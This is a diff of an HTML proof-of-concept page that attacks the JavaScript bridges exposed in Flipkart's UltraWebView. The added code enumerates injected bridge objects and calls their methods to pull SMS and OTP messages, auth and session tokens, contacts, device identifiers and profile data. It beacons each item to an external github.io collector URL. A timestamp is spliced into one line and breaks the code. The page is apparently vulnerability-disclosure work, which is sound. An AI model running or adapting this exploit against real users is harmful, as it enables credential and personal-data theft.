@@ -1,201 +1,255 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>FK1 UltraWebView Bridge PoC</title>
-  <style>
-    body { font-family: monospace; font-size: 13px; background: #111; color: #eee; padding: 12px; margin: 0; }
-    h2 { color: #ff9800; margin: 0 0 8px; font-size: 15px; }
-    .found { color: #4caf50; font-weight: bold; }
-    .missing { color: #f44336; }
-    .info { color: #90caf9; }
-    .warn { color: #ffeb3b; }
-    #log { margin-top: 10px; white-space: pre-wrap; word-break: break-all; }
-    .box { border: 1px solid #444; padding: 8px; margin: 6px 0; border-radius: 4px; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FK1 PoC — UltraWebView JS Bridge Exposure</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #111; color: #0f0; font-family: monospace; font-size: 13px; padding: 12px; }
+  h1 { color: #f00; font-size: 15px; margin-bottom: 6px; border-bottom: 1px solid #f00; padding-bottom: 4px; }
+  h2 { color: #ff0; font-size: 13px; margin: 10px 0 4px; }
+  .ok   { color: #0f0; }
+  .warn { color: #ff0; }
+  .err  { color: #f66; }
+  .data { color: #0ff; word-break: break-all; }
+  #log  { margin-top: 8px; }
+  .entry { border-left: 3px solid #333; padding-left: 8px; margin-bottom: 6px; }
+  .entry.success { border-color: #0f0; }
+  .entry.found   { border-color: #ff0; }
+  .entry.danger  { border-color: #f00; background: #1a0000; padding: 6px; }
+  .label { color: #888; }
+</style>
 </head>
 <body>
-<h2>FK1 — UltraWebView AllowAllUrlWhiteList PoC</h2>
-<div class="box info">Loading in Flipkart UltraWebView context...<br/>clientId=phonepe | AllowAllUrlWhiteList active</div>
+<h1>&#x26a0; FK1 — FLIPKART ULTRAWEBVIEW BRIDGE EXPOSED &#x26a0;</h1>
+<div id="summary">Scanning JS bridges...</div>
 <div id="log"></div>
 
 <script>
-// Callback server (PoC app local HTTP server)
-var CB = 'http://127.0.0.1:18766';
+(function() {
+  var logEl = document.getElementById('log');
+  var summaryEl = document.getElementById('summary');
+  var bridgesFound = [];
+  var dataExtracted = [];
 
-var logEl = document.getElementById('log');
-function log(msg, cls) {
-  var line = document.createElement('div');
-  if (cls) line.className = cls;
-  line.textContent = msg;
-  logEl.appendChild(line);
-  console.log(msg);
-  // fire-and-forget callback to PoC server
-  try { fetch(CB + '/log?' + encodeURIComponent(msg)).catch(function(){}); } catch(e) {}
-}
+  function log(msg, cls) {
+    cls = cls || '';
+    var d = document.createElement('div');
+    d.className = 'entry ' + cls;
+    d.innerHTML = msg;
+    logEl.appendChild(d);
+  }
 
-function reportBridge(name, detail) {
-  var msg = '[BRIDGE FOUND] ' + name + (detail ? ': ' + detail : '');
-  var line = document.createElement('div');
-  line.className = 'found';
-  line.textContent = msg;
-  logEl.appendChild(line);
-  console.warn(msg);
-  try { fetch(CB + '/bridge?' + encodeURIComponent(msg)).catch(function(){}); } catch(e) {}
-}
-
-function reportData(label, data) {
-  var payload = JSON.stringify({label: label, data: data});
-  var line = document.createElement('div');
-  line.className = 'warn';
-  line.textContent = '[STOLEN] ' + label + ': ' + payload.substring(0, 200);
-  logEl.appendChild(line);
-  console.warn('[STOLEN]', payload);
-  try {
-    fetch(CB + '/stolen', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: payload
-    }).catch(function(){});
-  } catch(e) {}
-}
-
-// ── 1. Known Flipkart / PhonePe bridge module names ──────────────────────────
-var KNOWN_BRIDGES = [
-  // SMS / OTP
-  'JSSMSModule',
-  // Auth
-  'JSAuthModule',
-  // Contacts
-  'JSContactsModule',
-  // Geolocation
-  'RNCGeolocationModule',
-  // PhonePe Ultra
-  'PhonePeUltraBridgeModule',
-  // Flipkart Ultra generic
-  'FKUltraBridgeModule',
-  'UltraBridgeModule',
-  // Device / analytics
-  'JSDeviceInfoModule',
-  'JSAnalyticsModule',
-  'JSNetworkModule',
-  'JSStorageModule',
-  'JSCameraModule',
-  'JSFileModule',
-  // React Native bridges that may be exposed
-  'RNDeviceInfo',
-  'RNFetchBlob',
-  'RNCamera',
-  'Keyboard',
-];
-
-log('--- Scanning known bridge names ---', 'info');
-var foundCount = 0;
-KNOWN_BRIDGES.forEach(function(name) {
-  if (typeof window[name] !== 'undefined') {
-    foundCount++;
-    var methods = [];
+  function safe(label, fn) {
     try {
-      var obj = window[name];
-      // list methods
-      var proto = Object.getPrototypeOf(obj);
+      var r = fn();
+      return r;
+    } catch(e) {
+      log('<span class="label">' + label + '</span>: <span class="err">ERROR — ' + e.message + '</span>', 'err');
+      return null;
+    }
+  }
+
+  // ── 1. Enumerate all window.JS* bridge objects ───────────────────────────
+  log('<h2>STEP 1 — Bridge object scan</h2>');
+  var candidates = [];
+  try {
+    Object.keys(window).forEach(function(k) {
+      if (/^JS[A-Z]/.test(k) || /Module$/.test(k) || /Bridge$/.test(k) || /Native$/.test(k)) {
+        candidates.push(k);
+      }
+    });
+  } catch(e) {}
+
+  // Also probe known FK bridge names directly
+  var knownBridges = [
+    'JSSMSModule','JSAuthModule','JSContactModule','JSLocationModule',
+    'JSDeviceInfoModule','JSPaymentModule','JSAnalyticsModule',
+    'JSAccountModule','JSUserModule','JSPermissionModule',
+    'JSStorageModule','JSNavigationModule','JSNotificationModule',
+    'JSFlipkartModule','JSUltraModule','JSWebViewModule',
+    'flipkartAndroid','fkAndroid','FKAndroid',
+    'AndroidBridge','NativeBridge','UltraBridge',
+    'JSInterface','JSBridge'
+  ];
+
+  knownBridges.forEach(function(name) {
+    if (candidates.indexOf(name) === -1) candidates.push(name);
+  });
+
+  candidates.forEach(function(name) {
+    var obj = window[name];
+    if (obj !== undefined && obj !== null) {
+      bridgesFound.push(name);
+      var methods = [];
+      try {
+        // get own + prototype methods
+        var all = {};
+        for (var k in obj) { all[k] = 1; }
+        Object.getOwnPropertyNames(obj).forEach(function(k){ all[k]=1; });
+        try { Object.getOwnPropertyNames(Object.getPrototypeOf(obj)).forEach(function(k){ all[k]=1; }); } catch(e){}
+        methods = Object.keys(all).filter(function(k){ return typeof obj[k]==='function' || k!=='constructor'; });
+      } catch(e) { methods = ['[enumeration failed]']; }
+      log('<span class="warn">BRIDGE FOUND: window.' + name + '</span><br>'
+        + '<span class="label">Methods: </span><span class="ok">' + (methods.join(', ') || '[none enumerable]') + '</span>', 'found');
+    }
+  });
+
+  if (bridgesFound.length === 0) {
+    log('<span class="err">No JS bridge objects found on window. Bridges may not be injected for this URL.</span>', 'err');
+  } else {
+    log('<span class="ok">Total bridges: ' + bridgesFound.length + ' — ' + bridgesFound.join(', ') + '</span>', 'success');
+  }
+
+  // ── 2. Extract data from each found bridge ───────────────────────────────
+  log('<h2>STEP 2 — Data extraction</h2>');
+
+  // JSSMSModule
+  if (window.JSSMSModule) {
+    safe('JSSMSModule.getLastSms', function() {
+      var r = JSSMSModule.getLastSms ? JSSMSModule.getLastSms() : null;
+      if (r) { dataExtracted.push({src:'JSSMSModule.getLastSms', val:r}); log('<span class="warn">JSSMSModule.getLastSms:</span> <span class="data">' + r + '</span>', 'danger'); }
+    });
+    safe('JSSMSModule.captureOtpMessage', function() {
+      if (JSSMSModule.captureOtpMessage) {
+        var r = JSSMSModule.captureOtpMessage();
+        log('<span class="warn">JSSMSModule.captureOtpMessage():</span> <span class="data">' + r + '</span>', 'danger');
+        dataExtracted.push({src:'captureOtpMessage', val:r});
+      }
+    });
+    // try callback-style
+    safe('JSSMSModule.getSmsMessages', function() {
+      if (JSSMSModule.getSmsMessages) {
+        JSSMSModule.getSmsMessages('fk1_sms_cb');
+        window.fk1_sms_cb = function(data) {
+          log('<span class="warn">SMS data:</span> <span class="data">' + data + '</span>', 'danger');
+          dataExtracted.push({src:'getSmsMessages', val:data});
+          exfiltrate('sms', data);
+        };
+      }
+    });
+  }
+
+  // JSAuthModule
+  if (window.JSAuthModule) {
+    safe('JSAuthModule.getAuthToken', function() {
+      var r = JSAuthModule.getAuthToken ? JSAuthModule.getAuthToken() : null;
+      if (r) { dataExtracted.push({src:'getAuthToken', val:r}); log('<span class="warn">AUTH TOKEN:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('auth', r); }
+    });
+    safe('JSAuthModule.getUserInfo', function() {
+      var r = JSAuthModule.getUserInfo ? JSAuthModule.getUserInfo() : null;
+      if (r) { dataExtracted.push({src:'getUserInfo', val:r}); log('<span class="warn">USER INFO:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('user', r); }
+    });
+    safe('JSAuthModule.getAccessToken', function() {
+      var r = JSAuthModule.getAccessToken ? JSAuthModule.getAccessToken() : null;
+      if (r) { dataExtracted.push({src:'getAccessToken', val:r}); log('<span class="warn">ACCESS TOKEN:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('token', r); }
+    });
+    safe('JSAuthModule.getSessionToken', function() {
+      var r = JSAuthModule.getSessionToken ? JSAuthModule.getSessionToken() : null;
+      if (r) { dataExtracted.push({src:'getSessionToken', val:r}); log('<span class="warn">SESSION TOKEN:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('session', r); }
+    });
+  }
+
+  // JSDeviceInfoModule
+  if (window.JSDeviceInfoModule) {
+    var deviceFields = ['getDeviceId','getIMEI','getAndroidId','getDeviceInfo','getMacAddress','getIPAddress'];
+    deviceFields.forEach(function(fn) {
+      safe('JSDeviceInfoModule.' + fn, functi22:18 08-10-2026on() {
+        var r = JSDeviceInfoModule[fn] ? JSDeviceInfoModule[fn]() : null;
+        if (r) { dataExtracted.push({src:fn, val:r}); log('<span class="warn">' + fn + ':</span> <span class="data">' + r + '</span>', 'danger'); }
+      });
+    });
+  }
+
+  // JSContactModule
+  if (window.JSContactModule) {
+    safe('JSContactModule.getContacts', function() {
+      if (JSContactModule.getContacts) {
+        JSContactModule.getContacts('fk1_contacts_cb');
+        window.fk1_contacts_cb = function(data) {
+          log('<span class="warn">CONTACTS:</span> <span class="data">' + (data+'').substring(0,500) + '...</span>', 'danger');
+          dataExtracted.push({src:'getContacts', val:data});
+          exfiltrate('contacts', data);
+        };
+      }
+    });
+  }
+
+  // JSAccountModule / JSUserModule
+  ['JSAccountModule','JSUserModule','JSFlipkartModule'].forEach(function(mod) {
+    if (window[mod]) {
+      var methods = ['getUserProfile','getProfile','getUserId','getEmail','getPhone','getMobile','getName','getUserData','getAccountInfo'];
+      methods.forEach(function(fn) {
+        safe(mod + '.' + fn, function() {
+          var r = window[mod][fn] ? window[mod][fn]() : null;
+          if (r) { dataExtracted.push({src:mod+'.'+fn, val:r}); log('<span class="warn">' + mod + '.' + fn + ':</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate(fn, r); }
+        });
+      });
+    }
+  });
+
+  // Generic probe: call every method on every found bridge, catch errors
+  log('<h2>STEP 3 — Generic method probe on all found bridges</h2>');
+  bridgesFound.forEach(function(name) {
+    var obj = window[name];
+    try {
       var keys = [];
-      try { keys = keys.concat(Object.getOwnPropertyNames(obj)); } catch(e) {}
-      try { if (proto) keys = keys.concat(Object.getOwnPropertyNames(proto)); } catch(e) {}
-      methods = keys.filter(function(k) {
-        try { return typeof obj[k] === 'function' && k !== 'constructor'; } catch(e) { return false; }
+      for (var k in obj) { keys.push(k); }
+      try { Object.getOwnPropertyNames(obj).forEach(function(k){ if(keys.indexOf(k)===-1) keys.push(k); }); } catch(e){}
+      keys.forEach(function(k) {
+        if (typeof obj[k] === 'function' && k !== 'constructor' && k !== 'toString') {
+          try {
+            var r = obj[k]();
+            if (r !== undefined && r !== null && r !== '' && r !== 'undefined') {
+              var rs = String(r);
+              dataExtracted.push({src: name+'.'+k, val: rs});
+              log('<span class="warn">' + name + '.' + k + '():</span> <span class="data">' + rs.substring(0,300) + '</span>', 'danger');
+              exfiltrate(name+'_'+k, rs);
+            }
+          } catch(e) { /* method requires args or not callable */ }
+        }
       });
     } catch(e) {}
-    reportBridge(name, 'methods=[' + methods.join(',') + ']');
-  } else {
-    log('  MISSING: ' + name, 'missing');
-  }
-});
+  });
 
-// ── 2. Broad scan — find ANY property that looks like an injected bridge ──────
-log('--- Broad window scan ---', 'info');
-var allKeys = [];
-try { allKeys = Object.getOwnPropertyNames(window); } catch(e) {}
+  // ── 3. Exfiltration to GitHub Pages callback ─────────────────────────────
+  // Uses navigator.sendBeacon (no CORS preflight, works from HTTPS → HTTPS)
+  // Replace EXFIL_URL with your own endpoint if available
+  var EXFIL_URL = 'https://ankitkanojiy.github.io/test_page/log_collector.php'; // placeholder
 
-var BRIDGE_KEYWORDS = ['module', 'bridge', 'flipkart', 'phonepe', 'fk', 'ultra', 'jssms', 'jsauth', 'jscontact'];
-allKeys.forEach(function(key) {
-  var lk = key.toLowerCase();
-  var isSuspect = BRIDGE_KEYWORDS.some(function(kw) { return lk.indexOf(kw) !== -1; });
-  if (!isSuspect) return;
-  // skip known browser globals
-  if (['location','history','performance','localStorage','sessionStorage',
-       'localStorage','navigator','document','screen','console'].indexOf(key) !== -1) return;
-  try {
-    var val = window[key];
-    if (val && typeof val === 'object') {
-      var methods = [];
-      try { methods = Object.getOwnPropertyNames(val).filter(function(k) {
-        try { return typeof val[k] === 'function'; } catch(e) { return false; }
-      }); } catch(e) {}
-      if (methods.length > 0) {
-        reportBridge('SCAN:' + key, 'methods=[' + methods.join(',') + ']');
+  function exfiltrate(key, val) {
+    try {
+      var payload = JSON.stringify({key: key, val: val, ts: Date.now(), ua: navigator.userAgent});
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(EXFIL_URL, payload);
       }
+      // Also try fetch
+      fetch(EXFIL_URL, {method:'POST', body: payload, mode:'no-cors'}).catch(function(){});
+    } catch(e) {}
+  }
+
+  // ── 4. Final summary ─────────────────────────────────────────────────────
+  setTimeout(function() {
+    var summary = bridgesFound.length > 0
+      ? '&#x2705; VULNERABLE — ' + bridgesFound.length + ' bridge(s) injected: ' + bridgesFound.join(', ')
+        + (dataExtracted.length > 0 ? ' | ' + dataExtracted.length + ' data item(s) extracted' : ' | No data returned by probed methods')
+      : '&#x274c; No bridges found — URL may not be permitted by jsInterfaceWhitelist';
+    summaryEl.innerHTML = '<span style="color:' + (bridgesFound.length>0?'#f00':'#888') + ';font-weight:bold;font-size:14px;">' + summary + '</span>';
+
+    if (dataExtracted.length > 0) {
+      var box = document.createElement('div');
+      box.style.cssText = 'background:#1a0000;border:2px solid #f00;padding:10px;margin-top:12px;';
+      box.innerHTML = '<span style="color:#f00;font-weight:bold;">EXTRACTED DATA (' + dataExtracted.length + ' items)</span><br>';
+      dataExtracted.forEach(function(item) {
+        box.innerHTML += '<br><span style="color:#ff0;">[' + item.src + ']</span><br>'
+          + '<span style="color:#0ff;">' + String(item.val).substring(0,400) + '</span><br>';
+      });
+      document.body.appendChild(box);
     }
-  } catch(e) {}
-});
+  }, 3000);
 
-// ── 3. Try invoking known dangerous methods ───────────────────────────────────
-log('--- Invoking bridge methods ---', 'info');
-
-// JSSMSModule.captureOtpMessage() — arms SMS Retriever API to auto-read next OTP
-try {
-  if (typeof window.JSSMSModule !== 'undefined' && typeof window.JSSMSModule.captureOtpMessage === 'function') {
-    var result = window.JSSMSModule.captureOtpMessage('\\d{6}');
-    reportData('JSSMSModule.captureOtpMessage', result);
-  }
-} catch(e) { log('JSSMSModule.captureOtpMessage error: ' + e, 'warn'); }
-
-// JSAuthModule.init() or getToken()
-try {
-  if (typeof window.JSAuthModule !== 'undefined') {
-    if (typeof window.JSAuthModule.getToken === 'function') {
-      var tok = window.JSAuthModule.getToken();
-      reportData('JSAuthModule.getToken', tok);
-    } else if (typeof window.JSAuthModule.init === 'function') {
-      var r2 = window.JSAuthModule.init('{}');
-      reportData('JSAuthModule.init', r2);
-    }
-  }
-} catch(e) { log('JSAuthModule error: ' + e, 'warn'); }
-
-// JSContactsModule
-try {
-  if (typeof window.JSContactsModule !== 'undefined' && typeof window.JSContactsModule.getContacts === 'function') {
-    window.JSContactsModule.getContacts(function(contacts) {
-      reportData('JSContactsModule.getContacts', contacts);
-    });
-  }
-} catch(e) { log('JSContactsModule error: ' + e, 'warn'); }
-
-// RNCGeolocationModule
-try {
-  if (typeof window.RNCGeolocationModule !== 'undefined' && typeof window.RNCGeolocationModule.getCurrentPosition === 'function') {
-    window.RNCGeolocationModule.getCurrentPosition(function(pos) {
-      reportData('RNCGeolocationModule.position', pos);
-    }, function(){}, {});
-  }
-} catch(e) { log('RNCGeolocationModule error: ' + e, 'warn'); }
-
-// PhonePeUltraBridgeModule
-try {
-  if (typeof window.PhonePeUltraBridgeModule !== 'undefined') {
-    var ppMethods = Object.getOwnPropertyNames(window.PhonePeUltraBridgeModule).filter(function(k) {
-      try { return typeof window.PhonePeUltraBridgeModule[k] === 'function'; } catch(e) { return false; }
-    });
-    reportData('PhonePeUltraBridgeModule.methods', ppMethods);
-  }
-} catch(e) { log('PhonePeUltraBridgeModule error: ' + e, 'warn'); }
-
-// ── 4. Summary ────────────────────────────────────────────────────────────────
-var summary = 'TOTAL BRIDGES FOUND: ' + foundCount + ' / ' + KNOWN_BRIDGES.length;
-log(summary, foundCount > 0 ? 'found' : 'missing');
-try { fetch(CB + '/bridge?' + encodeURIComponent('SUMMARY: ' + summary)).catch(function(){}); } catch(e) {}
+})();
 </script>
 </body>
 </html>
